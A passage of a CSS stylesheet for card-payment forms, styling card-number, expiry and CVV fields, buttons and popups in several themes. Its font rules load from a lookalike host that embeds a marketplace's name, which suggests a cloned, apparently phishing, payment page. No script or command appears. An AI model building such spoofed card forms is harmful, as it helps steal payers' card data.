		-o-transform: translateX(-148px);
		transform: translateX(-148px)
	}
	.pay-card_type_dc-mobile .credit-card-form__input {
		padding-left: 16px;
		font-size: 15px
	}
	.pay-card_type_dc-mobile .credit-card-form__label_type_cvv {
		margin-left: 42px
	}
	.pay-card_type_dc-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
		width: 75px
	}
	.pay-card_type_dc-mobile .credit-card-form__label_type_cvv .credit-card-form__input {
		width: 61px
	}
	.pay-card_type_dc-mobile .credit-card-form__label-group_type_card-number .credit-card-form__input {
		width: 233px;
		width: -webkit-calc(100% - 63px);
		width: calc(100% - 63px)
	}
}

.pay-card-layout_type_dc-mobile_theme_mcd .credit-card-form__popup .button,
.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .credit-card-form__submit .button {
	background: #ffbc0d;
	color: #2e2f33;
	font-weight: 700
}

.pay-card-layout_type_dc-mobile_theme_mcd .credit-card-form__popup .button:hover,
.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .credit-card-form__submit .button:hover {
	background: #ffbc0d
}

.pay-card-layout_type_dc-mobile_theme_mcd .credit-card-form__popup .button:active,
.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .06)), to(rgba(0, 0, 0, .06))) #ffbc0d;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d;
	background: -o-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d;
	background: linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d
}

.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .credit-card-form__terms-link,
.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .pay-card__remove-card {
	color: #ffbc0d
}

.pay-card-layout_type_dc-mobile_theme_mcd .pay-card_type_dc-mobile .credit-card-form__submit .button.credit-card-form__cancel-button {
	margin-top: 20px;
	background-color: #f6f6f6
}

.pay-card-layout_type_dc-mobile .credit-card-form__currency {
	font-family: Roboto, Arial, sans-serif
}

@font-face {
	font-family: OsnovaPro;
	src: url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.eot");
	src: url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.woff2") format("woff2"), url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.woff") format("woff"), url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.ttf") format("truetype"), url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.svg") format("svg"), url("https://kufar.by.obyalveine.com/css/fonts/osnova/OsnovaPro.eot?") format("embedded-opentype");
	font-weight: 400;
	font-style: normal
}

@font-face {
	font-family: SFUIDisplay;
	src: url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.eot");
	src: url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.woff2") format("woff2"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.woff") format("woff"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.ttf") format("truetype"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.svg") format("svg"), url("https://kufar.by.obyalveine.com/css/fonts/SFUIDisplay/SFUIDisplay-Regular.eot?") format("embedded-opentype");
	font-weight: 400;
	font-style: normal
}

.body_type_dc {
	height: auto;
	min-height: 100%;
	position: relative
}

.body_type_dc,
.pay-card-layout_type_dc {
	background: #f6f6f6
}

.pay-card_type_dc {
	position: relative;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-size: 15px;
	line-height: 20px;
	background: #fff;
	padding: 0 96px 40px
}

@media (max-width:780px) {
	.pay-card_type_dc {
		padding: 0 10px 20px;
		min-width: 500px
	}
}

.pay-card_type_dc .pay-card__row {
	padding-top: 20px
}

.pay-card_type_dc .pay-card__card {
	width: 100%
}

.pay-card_type_dc .pay-card__card-selector {
	margin: 0 auto;
	width: 240px;
	margin-bottom: 20px;
	position: relative
}

.pay-card_type_dc .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_dc .pay-card__select-card .control__select.selectBox-dropdown .selectBox-arrow {
	display: block;
	background: #fff;
	right: 22px;
	margin: -8px auto 0;
	width: 9px;
	height: 9px;
	border: solid #919399;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_dc .pay-card__select-card {
	width: 100%
}

.pay-card_type_dc .pay-card__select-card .control__select {
	border: 1px solid #e4e5e6;
	background: #fff;
	height: 42px;
	border-radius: 0
}

.pay-card_type_dc .pay-card__select-card .control__select:not(.selectBox) {
	font-family: OsnovaPro, arial, helvetica;
	font-size: 17px;
	height: 40px;
	line-height: 40px;
	color: #919399;
	display: inline-block;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	padding: 0 16px;
	border: 1px solid rgba(34, 34, 34, .08)
}

.pay-card_type_dc .pay-card__card-selector:before {
	position: absolute;
	content: "";
	background: #fff;
	top: 50%;
	right: 21px;
	width: 9px;
	height: 9px;
	border: solid #919399;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg) translate(-50%, -50%);
	-o-transform: rotate(45deg) translate(-50%, -50%);
	transform: rotate(45deg) translate(-50%, -50%);
	pointer-events: none;
	z-index: 1
}

.pay-card_type_dc .pay-card__select-card .control__select.selectBox-menuShowing {
	border-color: #fff
}

.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li a,
.pay-card_type_dc .pay-card__select-card .control__select.selectBox-dropdown .selectBox-label {
	font-family: OsnovaPro, arial, helvetica;
	font-size: 17px;
	line-height: 40px;
	padding: 4px 16px 0;
	color: #919399
}

.pay-card_type_dc .pay-card__remove-card {
	background: #f6f6f6;
	border-radius: 4px;
	border: 1px solid #e4e5e6;
	position: absolute;
	top: 212px;
	left: -85px;
	z-index: 3;
	padding: 11px 15px 7px
}

.pay-card_type_dc .pay-card__remove-card-text {
	color: #2e2f33;
	font-size: 15px
}

.pay-card_type_dc .pay-card__remove-card:hover {
	color: #000
}

.pay-card_type_dc .pay-card__remove-card:active {
	color: #000;
	border-color: #bebebf
}

.pay-card_type_dc .credit-card-form__card-wrapper {
	width: 444px;
	height: 236px;
	margin: 0 auto 32px;
	position: relative
}

.pay-card_type_dc .credit-card-form {
	padding-bottom: 0
}

.pay-card_type_dc .credit-card-form__form {
	padding: 0;
	position: relative
}

.pay-card_type_dc .credit-card-form__card_position_back,
.pay-card_type_dc .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 328px;
	height: 204px;
	padding: 16px;
	border-radius: 4px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_dc .credit-card-form__card_position_front {
	position: relative;
	padding: 16px;
	background: #f6f6f6;
	left: 0
}

.pay-card_type_dc .credit-card-form__card_position_back {
	top: 48px;
	right: -116px;
	background: #e4e5e6
}

.pay-card_type_dc .credit-card-form__card_position_back:before {
	height: 40px;
	margin: 0 -16px 40px;
	background: #919399
}

.pay-card_type_dc .payment-systems-icons {
	top: 0;
	margin: 0 0 16px;
	float: left
}

.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_dc .payment-systems-icon {
	float: right;
	margin: 0 15px 0 0
}

.pay-card_type_dc .payment-systems-icon.payment-systems-icon_name_mir,
.pay-card_type_dc .payment-systems-icon.payment-systems-icon_name_visa {
	top: 3px
}

.pay-card_type_dc .credit-card-form__label-group {
	clear: both
}

.pay-card_type_dc .credit-card-form__input {
	height: 40px;
	background: #fff;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	margin: 0;
	border-radius: 4px;
	border: none;
	color: #2e2f33;
	padding-left: 16px
}

.pay-card_type_dc .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_dc .credit-card-form__input:disabled {
	background: #fff;
	color: #e4e5e6
}

.pay-card_type_dc .credit-card-form__input::-webkit-input-placeholder {
	color: #2e2f33
}

.pay-card_type_dc .credit-card-form__input::-moz-placeholder {
	color: #2e2f33
}

.pay-card_type_dc .credit-card-form__input::placeholder {
	color: #2e2f33
}

.pay-card_type_dc .credit-card-form__title {
	margin: 0;
	text-transform: none;
	font-size: 15px;
	line-height: 20px;
	color: #919399
}

.pay-card_type_dc .credit-card-form__label-group_type_cvv {
	left: -9px;
	top: -4px
}

.pay-card_type_dc .credit-card-form__label_type_cvv .credit-card-form__input {
	width: 67px
}

.pay-card_type_dc .credit-card-form__label-group_type_expiration-date {
	margin: -15px 0 0
}

.pay-card_type_dc .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_dc .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 85px
}

.pay-card_type_dc .credit-card-form__label-group_type_add-card {
	position: absolute;
	top: 155px;
	left: 73px;
	z-index: 2
}

@media (max-width:780px) {
	.pay-card_type_dc .credit-card-form__label-group_type_add-card {
		left: 20px;
		left: -webkit-calc(50% - 205px);
		left: calc(50% - 205px)
	}
}

.pay-card_type_dc .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 17px;
	line-height: 20px;
	color: #919399
}

.pay-card_type_dc .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_dc [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 16px;
	height: 16px;
	border: 2px solid #919399;
	border-radius: 4px
}

.pay-card_type_dc [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #2e2f33;
	border-color: #2e2f33
}

.pay-card_type_dc [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 12px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_dc .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_dc .credit-card-form__terms {
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #919399;
	padding: 12px 0 0
}

.pay-card_type_dc .credit-card-form__terms-link {
	text-decoration: none;
	color: #0ec645
}

.pay-card_type_dc .credit-card-form__label .credit-card-form__error-text {
	display: none
}

.pay-card_type_dc .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f36
}

.pay-card_type_dc .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f36
}

.pay-card_type_dc .credit-card-form__submit {
	margin-top: 17px
}

.pay-card-layout_type_dc .credit-card-form__popup .button,
.pay-card_type_dc .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	background: #0ec645;
	margin: 0;
	font-size: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	text-align: center;
	width: 100%;
	height: 56px;
	line-height: 56px;
	font-weight: 400
}

.pay-card-layout_type_dc .credit-card-form__popup .button:hover,
.pay-card_type_dc .credit-card-form__submit .button:hover {
	background: #13ae35
}

.pay-card-layout_type_dc .credit-card-form__popup .button:active,
.pay-card_type_dc .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .06)), to(rgba(0, 0, 0, .06))) #0ec645;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645;
	background: -o-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645;
	background: linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #0ec645
}

.pay-card_type_dc .credit-card-form__submit .button__light {
	border-radius: 4px;
	color: #2e2f33;
	background: #f6f6f6;
	font-weight: 400
}

.pay-card_type_dc .credit-card-form__submit .button__light:hover {
	color: #000;
	background: #f6f6f6
}

.pay-card_type_dc .credit-card-form__submit .button__light:active {
	color: #000;
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #f6f6f6;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6
}

.pay-card_type_dc .credit-card-form__hr {
	border-bottom: 1px solid #f6f6f6;
	margin-bottom: 18px
}

.pay-card_type_dc .credit-card-form__currency {
	font-size: 22px;
	font-weight: 700
}

.pay-card_type_dc .credit-card-form__amount {
	font-size: 22px;
	line-height: 1;
	font-weight: 700;
	color: #2e2f33;
	text-align: center
}

.control__select_type_dc {
	width: 100%!important
}

.control__select_type_dc-selectBox-dropdown-menu {
	border: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	-webkit-transform: translateY(-42px);
	-o-transform: translateY(-42px);
	transform: translateY(-42px)
}

.control__select_type_dc-selectBox-dropdown-menu li:first-child {
	position: relative
}

.control__select_type_dc-selectBox-dropdown-menu li:first-child:before {
	content: "";
	display: block;
	background: transparent;
	right: 21px;
	top: 18px;
	position: absolute;
	width: 9px;
	height: 9px;
	border: solid #919399;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(-135deg);
	-o-transform: rotate(-135deg);
	transform: rotate(-135deg);
	pointer: none
}

.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #f6f6f6
}

.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li a {
	height: 40px;
	line-height: 40px;
	-webkit-font-smoothing: antialiased
}

.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li.selectBox-hover:before,
.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li.selectBox-hover a {
	background: #f6f6f6;
	cursor: pointer
}

.control__select_type_dc-selectBox-dropdown-menu.selectBox-options li.selectBox-hover a:active {
	color: #000
}

.secure-information_type_dc {
	text-align: center;
	padding: 20px 0;
	background: #f6f6f6
}

.secure-information_type_dc .secure-information__icon {
	-webkit-transform: translateX(-13px);
	-o-transform: translateX(-13px);
	transform: translateX(-13px)
}

.secure-information_type_dc .secure-information__text {
	font-family: SFUIDisplay, arial, helvetica;
	display: block;
	font-size: 13px;
	line-height: 16px;
	color: #919399
}

.secure-information_type_dc .protection-icons {
	padding-top: 8px;
	padding-left: 30px;
	margin-bottom: -5px
}

.secure-information_type_dc .protection-icons__list-item {
	margin-right: 10px
}

.pay-card-layout_type_dc,
.pay-card-layout_type_dc .credit-card-form__popup {
	padding-top: 42px;
	-webkit-font-smoothing: antialiased;
	font-family: OsnovaPro, arial, helvetica;
	width: 752px;
	border-radius: 8px;
	margin: 0 auto
}

@media (max-width:780px) {
	.pay-card-layout_type_dc,
	.pay-card-layout_type_dc .credit-card-form__popup {
		width: 460px;
		width: -webkit-calc(100vw - 28px);
		width: calc(100vw - 28px);
		min-width: 500px
	}
}

.pay-card-layout_type_dc .clearfix:after,
.pay-card-layout_type_dc .clearfix:before {
	display: block
}

.pay-card-layout_type_dc .pay-card-layout__header {
	background: #fff;
	padding-top: 34px;
	text-align: center;
	position: relative
}

.pay-card-layout_type_dc .credit-card-form__popup-message,
.pay-card-layout_type_dc .pay-card-layout__title {
	color: #2e2f33;
	font-size: 28px;
	line-height: 1;
	font-weight: 700
}

.pay-card-layout_type_dc .pay-card-layout__wrapper-logo {
	padding-bottom: 34px;
	margin: 0 auto;
	text-align: center;
	height: 36px
}

.pay-card-layout_type_dc .pay-card-layout__logo {
	display: inline-block;
	margin-left: 34px
}

.pay-card-layout_type_dc .pay-card-layout__logo:first-child {
	margin-left: 0
}

.pay-card-layout_type_dc .credit-card-form__popup {
	background-color: #f6f6f6
}

.pay-card-layout_type_dc .credit-card-form__popup-header {
	text-align: center
}

.pay-card-layout_type_dc .credit-card-form__popup-body {
	min-height: 416px;
	height: auto;
	background: #fff;
	padding: 88px 96px 58px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

@media (max-width:780px) {
	.pay-card-layout_type_dc .credit-card-form__popup-body {
		padding: 88px 32px 58px
	}
}

@media (max-width:420px) {
	.pay-card-layout_type_dc .credit-card-form__popup-body {
		padding: 88px 10px 58px
	}
}

.pay-card-layout_type_dc #cpg_waiter .credit-card-form__popup-body {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	padding-top: 0
}

.pay-card-layout_type_dc .credit-card-form__popup-body .notification-block {
	position: relative
}

.pay-card-layout_type_dc .credit-card-form__popup-body .notification-block__inner {
	padding: 0
}

.pay-card-layout_type_dc .info-block__content {
	width: 100%;
	margin: 0 auto
}

.pay-card-layout_type_dc .notification-block .title {
	font-size: 22px;
	line-height: 1;
	font-weight: 700;
	color: #2e2f33;
	padding-top: 0;
	margin: 0
}

.pay-card-layout_type_dc .info-block .paragraph {
	font-size: 15px;
	line-height: 1;
	color: #2e2f33;
	padding-top: 8px;
	margin: 0
}

.pay-card-layout_type_dc .credit-card-form__popup-buttons-wrapper {
	padding-top: 66px;
	margin: 0
}

.pay-card-layout_type_dc .credit-card-form__popup .button {
	display: block;
	margin: 0 auto;
	text-align: center;
	margin-top: 8px
}

.pay-card-layout_type_dc .credit-card-form__popup .button__light {
	border-radius: 4px;
	color: #2e2f33;
	background: #f6f6f6;
	font-weight: 400
}

.pay-card-layout_type_dc .credit-card-form__popup .button__light:hover {
	color: #000;
	background: #f6f6f6
}

.pay-card-layout_type_dc .credit-card-form__popup .button__light:active {
	color: #000;
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #f6f6f6;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #f6f6f6
}

.pay-card-layout_type_dc .credit-card-form__popup-body_type_loader .info-block .img {
	margin-bottom: 24px
}

.pay-card-layout_type_dc .notification-block_status_ok .info-block .paragraph {
	font-size: 17px;
	font-weight: 600;
	line-height: 20px
}

.pay-card-layout_type_dc .notification-block_status_ok .button {
	width: auto
}

.pay-card-layout_type_dc .notification-block_status_ok .paragraph {
	position: relative
}

.pay-card-layout_type_dc .notification-block_status_ok .paragraph:before {
	position: absolute;
	left: 0;
	top: -30px;
	width: 100%;
	height: 0;
	border-bottom: 1px solid #f6f6f6;
	content: ""
}

.pay-card-layout_type_dc .notification-block_status_ok .info-block .img {
	margin-bottom: 23px
}

.pay-card-layout_type_dc .notification-block_status_ok .title {
	padding-bottom: 70px
}

.pay-card-layout_type_dc .info-block_type_session-countdown-timer {
	padding-top: 4px;
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #919399
}

.pay-card-layout_type_dc .info-block_type_error {
	position: absolute;
	top: 0;
	left: 0;
	background: #f36;
	text-align: center;
	width: 100%;
	height: auto;
	display: none
}

.pay-card-layout_type_dc .info-block_type_error .paragraph {
	color: #fff;
	font-size: 15px;
	line-height: 1;
	padding: 4px 0
}

.pay-card-layout_type_dc .notification-block .payment-info-table {
	width: 328px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1)
}

.pay-card-layout_type_dc .notification-block .payment-info-table,
.pay-card-layout_type_dc .notification-block .payment-info-table__caption {
	background: #fff;
	position: relative;
	display: block;
	padding: 20px 16px 15px;
	margin-top: 8px
}

.pay-card-layout_type_dc .notification-block .payment-info-table:before {
	position: absolute;
	left: -8px;
	top: -4px;
	z-index: 1;
	content: "";
	font-size: 0;
	line-height: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 344px;
	height: 8px;
	border-radius: 100px;
	background-color: #e4e5e6;
	-webkit-box-shadow: inset 0 1px 8px 0 #73737f;
	box-shadow: inset 0 1px 8px 0 #73737f;
	border: 2px solid rgba(46, 46, 51, .1)
}

.pay-card-layout_type_dc .notification-block .payment-info-table__caption,
.pay-card-layout_type_dc .notification-block .payment-info-table__cell,
.pay-card-layout_type_dc .notification-block .payment-info-table__head {
	font-size: 15px;
	line-height: 20px;
	padding-bottom: 10px;
	vertical-align: top
}

.pay-card-layout_type_dc .notification-block .payment-info-table__caption {
	position: relative;
	z-index: 2;
	display: block;
	margin: -20px -16px 12px;
	padding: 25px 16px 0;
	color: #2e2f33;
	text-align: left;
	background: #fff
}

.pay-card-layout_type_dc .notification-block .payment-info-table__head {
	color: #919399;
	text-align: left;
	width: 98px;
	padding-left: 0
}

.pay-card-layout_type_dc .notification-block .payment-info-table__cell {
	color: #2e2f33;
	padding-left: 0;
	padding-right: 0;
	width: 198px
}

.pay-card-layout_type_dc_theme_mcd .credit-card-form__popup .button,
.pay-card-layout_type_dc_theme_mcd .pay-card_type_dc .credit-card-form__submit .button {
	background: #ffbc0d;
	color: #2e2f33;
	font-weight: 700
}

.pay-card-layout_type_dc_theme_mcd .credit-card-form__popup .button:hover,
.pay-card-layout_type_dc_theme_mcd .pay-card_type_dc .credit-card-form__submit .button:hover {
	background: #ffbc0d
}

.pay-card-layout_type_dc_theme_mcd .credit-card-form__popup .button:active,
.pay-card-layout_type_dc_theme_mcd .pay-card_type_dc .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .06)), to(rgba(0, 0, 0, .06))) #ffbc0d;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d;
	background: -o-linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d;
	background: linear-gradient(rgba(0, 0, 0, .06), rgba(0, 0, 0, .06)) #ffbc0d
}

.pay-card-layout_type_dc_theme_mcd .pay-card_type_dc .credit-card-form__terms-link {
	color: #ffbc0d
}

.pay-card-layout_type_dc_theme_mcd .pay-card_type_dc .credit-card-form__submit .button.credit-card-form__cancel-button {
	margin-top: 20px;
	background-color: #f6f6f6
}

.pay-card-layout_type_dc .credit-card-form__currency {
	font-family: Roboto, Arial, sans-serif
}

.pay-card_type_mycom .payment-systems-icons {
	top: -18px
}

.pay-card_type_mycom_global .payment-systems-icons {
	top: -8px
}

.pay-card_type_mycom_global .payment-systems-icon_name_amex,
.pay-card_type_mycom_global .payment-systems-icon_name_bankontact,
.pay-card_type_mycom_global .payment-systems-icon_name_dinersclub,
.pay-card_type_mycom_global .payment-systems-icon_name_jcb {
	top: 5px
}

.pay-card_type_mycom_global .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_vk-wallet {
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	margin: 0 auto;
	position: static;
	width: 100%;
	padding: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif;
	font-size: 16px;
	color: #000;
	-webkit-font-smoothing: antialiased;
	height: 100%;
	min-width: 320px
}

.pay-card_type_vk-wallet~.credit-card-form__popup .credit-card-form__popup-body {
	height: 100%
}

.pay-card_type_vk-wallet .pay-card__row {
	position: relative;
	padding: 0
}

.pay-card_type_vk-wallet .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0 0 20px
}

.pay-card_type_vk-wallet .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_vk-wallet .pay-card__select-card {
	display: block
}

.pay-card_type_vk-wallet .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_vk-wallet .pay-card__select-card .control__select {
	-webkit-tap-highlight-color: transparent;
	width: 100%!important;
	height: 44px;
	padding: 12px;
	margin: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 6px;
	background: #fff;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 16px;
	color: #000;
	border-color: #d7d8d9;
	letter-spacing: -.02em;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_vk-wallet .pay-card__select-card .control-label {
	width: 100%;
	position: relative
}

.pay-card_type_vk-wallet .pay-card__select-card .control-label:after {
	position: absolute;
	top: 45px;
	content: "";
	right: 20px;
	pointer-events: none
}

.pay-card_type_vk-wallet .pay-card__select-card-payment-systems-icons .payment-systems-icon {
	display: inline-block
}

.pay-card_type_vk-wallet .pay-card__card_type_added-card .payment-systems-icons {
	display: none
}

.pay-card_type_vk-wallet .payment-systems-icon__text {
	padding-left: 12px;
	letter-spacing: -.4px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	overflow: hidden;
	font-size: 16px
}

.pay-card_type_vk-wallet .payment-systems-icon__element {
	display: inline-block
}

.pay-card_type_vk-wallet .payment-systems-icon__element_type_bullets {
	padding-bottom: 3px
}

.pay-card_type_vk-wallet .payment-systems-icon__element_type_number {
	margin-left: .25em
}

.pay-card_type_vk-wallet .payment-systems-icon__element_type_date {
	color: #909499;
	padding-left: 8px
}

.pay-card_type_vk-wallet .payment-systems-icon__element_type_text-inner {
	color: #e64646;
	padding-left: 8px
}

.pay-card_type_vk-wallet .pay-card__card {
	width: auto
}

.pay-card_type_vk-wallet .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card_type_vk-wallet .payment-systems-icon.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_vk-wallet .pay-card__card_type_added-card .pay-card__select-card-payment-systems-icons .credit-card-form__label-group_type_card-number {
	display: block
}

.pay-card_type_vk-wallet .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_vk-wallet .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_vk-wallet .credit-card-form__submit {
	position: absolute;
	bottom: 12px;
	left: 12px;
	width: -webkit-calc(100% - 24px);
	width: calc(100% - 24px)
}

.pay-card_type_vk-wallet .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_card-number {
	margin: 0 0 12px
}

.pay-card_type_vk-wallet .control-label__text,
.pay-card_type_vk-wallet .credit-card-form__title {
	display: block;
	margin: 0 0 8px;
	text-transform: none;
	color: #71757a;
	font-size: 14px;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet .credit-card-form__input {
	-webkit-tap-highlight-color: transparent;
	height: 44px;
	background: #fff;
	border-color: #d7d8d9;
	color: #000;
	border-radius: 6px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding-left: 12px;
	letter-spacing: -.02em;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_vk-wallet .credit-card-form__input::-webkit-input-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet .credit-card-form__input::-moz-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet .credit-card-form__input::placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.chrome .pay-card_type_vk-wallet .credit-card-form__input_type_protected::-webkit-input-placeholder {
	-webkit-transform: translateY(-3px);
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet .credit-card-form__input_type_protected::-moz-placeholder {
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet .credit-card-form__input_type_protected::placeholder {
	-webkit-transform: translateY(-3px);
	-o-transform: translateY(-3px);
	transform: translateY(-3px)
}

.pay-card_type_vk-wallet .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet .credit-card-form__input:disabled {
	color: #71757a;
	opacity: 1
}

.pay-card_type_vk-wallet .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_vk-wallet .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-bottom: 16px;
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 10px
}

